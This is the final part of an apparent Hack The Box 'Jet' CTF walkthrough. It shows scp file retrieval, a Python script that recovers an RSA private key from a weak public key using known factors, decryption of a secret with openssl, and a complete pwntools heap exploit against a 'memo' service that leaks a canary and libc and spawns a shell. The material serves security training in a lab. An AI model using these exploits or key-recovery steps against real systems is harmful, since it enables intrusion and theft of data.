&nbsp;                     -.            \\\_|//     |||\\\\  ~~~~~~::::... /~

&nbsp;                  \_\_\_-==\_       \_-~o~  \\/    |||  \\\\            \_/~~-

&nbsp;          \_\_---~~~.==~||\\=\_    -\_--~/\_-~|-   |\\\\   \\\\        \_/~

&nbsp;      \_-~~     .=~    |  \\\\-\_    '-~7  /-   /  ||    \\      /

&nbsp;    .~       .~       |   \\\\ -\_    /  /-   /   ||      \\   /

&nbsp;   /  \_\_\_\_  /         |     \\\\ ~-\_/  /|- \_/   .||       \\ /

&nbsp;   |~~    ~~|--~~~~--\_ \\     ~==-/   | \\~--===~~        .\\

&nbsp;            '         ~-|      /|    |-~\\~~       \_\_--~~

&nbsp;                        |-~~-\_/ |    |   ~\\\_   \_-~            /\\

&nbsp;                             /  \\     \\\_\_   \\/~                \\\_\_

&nbsp;                         \_--~ \_/ | .-~~\_\_\_\_--~-/                  ~~==.

&nbsp;                        ((->/~   '.|||' -\_|    ~~-/ ,              . \_||

&nbsp;                                   -\_     ~\\      ~~---l\_\_i\_\_i\_\_i--~~\_/

&nbsp;                                   \_-~-\_\_   ~)  \\--\_\_\_\_\_\_\_\_\_\_\_\_\_\_--~~

&nbsp;                                 //.-~~~-~\_--~- |-------~~~~~~~~

&nbsp;                                        //.-~~~--\\









Flag9:JET{h.....z}





At, tony's home directory, we find some interesting things.



membermanager@jet:~$ cd /home/tony



membermanager@jet:/home/tony$ ls

key.bin.enc  keys  secret.enc



membermanager@jet:/home/tony$ cd keys



membermanager@jet:/home/tony/keys$ ls

public.crt





Let's bring them to our attacker machine.



kali@kali:scp -i man\_rsa membermanager@10.13.37.10:/home/tony/keys/public.crt .  

&nbsp;                                                                                 

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

public.crt                                                                                                                 100%  451     0.9KB/s   00:00    



kali@kali:scp -i man\_rsa membermanager@10.13.37.10:/home/tony/key.bin.enc .        

&nbsp;                                                                           

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

key.bin.enc                                                                                                                100%  129     0.3KB/s   00:00    



kali@kali:scp -i man\_rsa membermanager@10.13.37.10:/home/tony/secret.enc .       

&nbsp;                                                                                

\*\* WARNING: connection is not using a post-quantum key exchange algorithm.

\*\* This session may be vulnerable to "store now, decrypt later" attacks.

\*\* The server may need to be upgraded. See https://openssh.com/pq.html

secret.enc                                                                                                                 100% 4768     4.7KB/s   00:01 



First determie keys of public.crt



membermanager@jet:/home/tony/keys$ python -c "from Crypto.PublicKey import RSA; file = open('public.crt', 'r'); key = RSA.importKey(file.read()); e = key.e; n = key.n; print('e: {}'.format(e)); print('n: {}'.format(n)); file.close()"

e: 115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139

n: 279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517





Now, create a python code, to create a private.crt



kali@kali:cat cryptdecrypt.py 



\#!/usr/bin/python3

from Crypto.PublicKey import RSA



file = open("public.crt", "r")

key = RSA.importKey(file.read())

e = key.e

n = key.n

p = 13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083  

q = 20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199  

m = n - (p + q - 1)



def egcd(a, b):

&nbsp;   if a == 0:

&nbsp;       return (b, 0, 1)

&nbsp;   else:

&nbsp;       g, y, x = egcd(b % a, a)

&nbsp;       return (g, x - (b // a) \* y, y)



def modinv(a, m):

&nbsp;   g, x, y = egcd(a, m)

&nbsp;   if g != 1:

&nbsp;       raise

&nbsp;   else:

&nbsp;       return x % m



d = modinv(e, m)

key = RSA.construct((n, e, d, p, q))

print(key.exportKey().decode())





kali@kali:python3 cryptdecrypt.py     

&nbsp;                                                                                                                            

-----BEGIN RSA PRIVATE KEY-----

MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd

gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf

ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk

zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc

EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW

i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz

d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B

A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC

h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn

cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ

fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur

bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9

-----END RSA PRIVATE KEY-----





Save, this as a private.crt and decrypt the secret.





kali@kali:openssl pkeyutl -decrypt -inkey private.crt -in key.bin.enc -out file



kali@kali:openssl aes-256-cbc -d -in secret.enc -pass file:file  

&nbsp;                                                                                                 

\*\*\* WARNING : deprecated key derivation used.

Using -iter or -pbkdf2 would be better.

&nbsp;▄▄▄██▀▀▀▓█████▄▄▄█████▓      ▄████▄   ▒█████   ███▄ ▄███▓                                                                                                   

&nbsp;  ▒██   ▓█   ▀▓  ██▒ ▓▒     ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒    Congratulations!!                                                           

&nbsp;  ░██   ▒███  ▒ ▓██░ ▒░     ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░                                                                                      

▓██▄██▓  ▒▓█  ▄░ ▓██▓ ░      ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██     Jet: https://jet.com/careers                                                           

&nbsp;▓███▒   ░▒████▒ ▒██▒ ░  ██▓ ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒    HTB: https://www.hackthebox.eu                                                     

&nbsp;▒▓▒▒░   ░░ ▒░ ░ ▒ ░░    ▒▓▒ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░                                                                                                     

&nbsp;▒ ░▒░    ░ ░  ░   ░     ░▒    ░  ▒     ░ ▒ ▒░ ░  ░      ░    JET{n......7}                                                              

&nbsp;░ ░ ░      ░    ░       ░   ░        ░ ░ ░ ▒  ░      ░                                                                                                        

&nbsp;░   ░      ░  ░          ░  ░ ░          ░ ░         ░                                                                                                        

&nbsp;                         ░  ░                                                                                                                                 

&nbsp;                                 Props to:           ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄█████▓ ██░ ██ ▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒     ▓█████  █    ██ 

&nbsp;                                                     ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░     ▓█   ▀  ██  ▓██▒

&nbsp;                                     blink (jet)     ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░     ▒███   ▓██  ▒██░

&nbsp;                                     g0blin (htb)    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒      ▒▓█  ▄ ▓▓█  ░██░

&nbsp;                                     forGP (htb)     ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄  ▒██▒ ░ ░▓█▒░██▓░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒ ██▓ ░▒████▒▒▒█████▓ 

&nbsp;                                     ch4p (htb)       ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ░░ ▒░ ░░▒▓▒ ▒ ▒ 

&nbsp;                                     xero (0x00sec)   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░     ▒ ░▒░ ░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░ ░▒   ░ ░  ░░░▒░ ░ ░ 

&nbsp;                                                      ░  ░░ ░  ░   ▒   ░        ░ ░░ ░   ░       ░  ░░ ░   ░    ░    ░ ░ ░ ░ ▒   ░    ░   ░      ░    ░░░ ░ ░ 

&nbsp;                                                      ░  ░  ░      ░  ░░ ░      ░  ░             ░  ░  ░   ░  ░ ░          ░ ░   ░    ░    ░     ░  ░   ░     

&nbsp;                                                                       ░                                             ░                     ░                  







With this, we get our 10th flag.



Flag10:JET{n......7} 







Now, back to pwn on memo binary.

As said, I am bad with pwn, let's take help online





kali@kali:cat memo.py



\#!/usr/bin/python3

from pwn import remote, p64, u64



shell = remote("10.13.37.10", 7777)



def create\_memo(data, answer, more):

&nbsp;   shell.sendlineafter(b"> ", b"1")

&nbsp;   shell.sendlineafter(b"Data: ", data)

&nbsp;   if answer\[:3] == "yes":

&nbsp;       shell.sendafter(b"\[yes/no] ", answer.encode())

&nbsp;   else:

&nbsp;       shell.sendafter(b"\[yes/no] ", answer)

&nbsp;       shell.sendafter(b"Data: ", more)



def show\_memo():

&nbsp;   shell.sendlineafter(b"> ", b"2")

&nbsp;   shell.recvuntil(b"Data: ")



def delete\_memo():

&nbsp;   shell.sendlineafter(b"> ", b"3")



def tap\_out(answer):

&nbsp;   shell.sendlineafter(b"> ", b"4")

&nbsp;   shell.sendafter(b"\[yes/no] ", answer)



create\_memo(b"A" \* 0x1f, b"no", b"A" \* 0x1f)

show\_memo()

shell.recv(0x20)

stack\_chunk = u64(shell.recv(6) + b"\\x00" \* 2) - 0x110

delete\_memo()

create\_memo(b"A" \* 0x28, b"no", b"A" \* 0x28)

show\_memo()

shell.recvuntil(b"A" \* 0x28)

shell.recv(1)

canary = u64(b"\\x00" + shell.recv(7))

create\_memo(b"A" \* 0x18, b"no", b"A" \* 0x18)

create\_memo(b"A" \* 0x18, b"no", b"A" \* 0x17)

show\_memo()

shell.recvuntil(b"A" \* 0x18)

shell.recv(1)

heap = u64(b"\\x00" + shell.recv(3).ljust(7, b"\\x00"))

create\_memo(b"A" \* 0x18, b"no", b"A" \* 0x8 + p64(0x91) + b"A" \* 0x8)

create\_memo(b"A" \* 0x7 + b"\\x00", b"no", b"A" \* 0x8)

create\_memo(b"A" \* 0x7 + b"\\x00", b"no", b"A" \* 0x8)

create\_memo(b"A" \* 0x7 + b"\\x00", b"no", b"A" \* 0x8)

create\_memo(b"A" \* 0x7 + b"\\x00", b"no", b"A" \* 0x8 + p64(0x31))

create\_memo(b"A" \* 0x7 + b"\\x00", b"no", b"A" \* 0x8)

tap\_out(b"no\\x00" + b"A" \* 21 + p64(heap + 0xe0))

delete\_memo()

tap\_out(b"no\\x00" + b"A" \* 21 + p64(heap + 0xc0))

delete\_memo()

show\_memo()

leak = u64(shell.recv(6).ljust(8, b"\\x00"))

libc = leak - 0x3c4b78

create\_memo(b"A" \* 0x28, b"no", b"A" \* 0x10 + p64(0x0) + p64(0x21) + p64(stack\_chunk))

create\_memo(p64(leak) \* (0x28 // 8), b"no", b"A" \* 0x28)

create\_memo(b"A" \* 0x8 + p64(0x21) + p64(stack\_chunk + 0x18) + b"A" \* 0x8 + p64(0x21), "yes", b"")  

create\_memo(b"A" \* 0x8, b"no", p64(canary) + b"A" \* 0x8 + p64(libc + 0x45216))

tap\_out(b"yes\\x00")

shell.recvline()

shell.interactive()







kali@kali:python3 memo.py

\[+] Opening connection to 10.13.37.10 on port 7777: Done

\[\*] Switching to interactive mode

$ id

uid=1007(memo) gid=1007(memo) groups=1007(memo)

$ cd /home/memo

$ ls

flag.txt

memo

$ cat flag.txt

Congrats! JET{7.....7}



&nbsp;                              .\\

&nbsp;                        .\\   / \_\\   .\\

&nbsp;                       /\_ \\   ||   / \_\\

&nbsp;                        ||    ||    ||

&nbsp;                 ; ,     \\`.\_\_||\_\_.'/

&nbsp;         |\\     /( ;\\\_.;  `./|  \_\_.'

&nbsp;         ' `.  \_|\_\\/\_;-'\_ .' '||

&nbsp;          \\ \_/`       `.-\\\_ / ||      \_

&nbsp;      , \_ \_`; ,--.   ,--. ;'\_ \_|,     |

&nbsp;      '`''\\| /  ,-\\ | \_,-\\ |/''`'  \_  |

&nbsp;       \\ .-- \\\_\_\\\_/ /` )\_/ --. /   |  |       \_

&nbsp;       /    .         -'  .    \\ --|--|--.  .' \\

&nbsp;      |     /             \\     |  |  |   \\ |---'

&nbsp;   .   .  -' `-..\_\_\_\_...-' `-  .   |  |    |\\  \_

&nbsp;.'`'.\_\_ `.\_      `-..-''    \_.'|   |  | \_  | `-'      \_

&nbsp; \\ .--.`.  `-..\_\_    \_,..-'   L|   |    |             |

&nbsp;  '    \\ \\      \_,| |,\_      /\_7)  |    |   \_       \_ |  \_

&nbsp;        \\ \\    /       \\ \_.-'/||        | .' \\     \_| |  |

&nbsp;         \\ \\  /.'|   |`.\_\_.'` ||     .--| |--- \_   /| |  |

&nbsp;          \\ `//\_/     \\       ||    /   | \\  \_ \\  / | |  |

&nbsp;           `/ \\|       |      ||   |    |  `-'  \\/  | '--|      \_

&nbsp;            `"`'.  \_  .'      ||    `--'|                |   .--/

&nbsp;                 \\ | /        ||                         '--'

&nbsp;                  |'|  mx     'J        made me do it! ;)

&nbsp;               .-.|||.-.

&nbsp;              '----"----'







This is the final flag, i.e. flag11



Flag11:JET{7.....7}





With this we wrap up the challenge. It took longer that expected because of too many pwn based ctf.







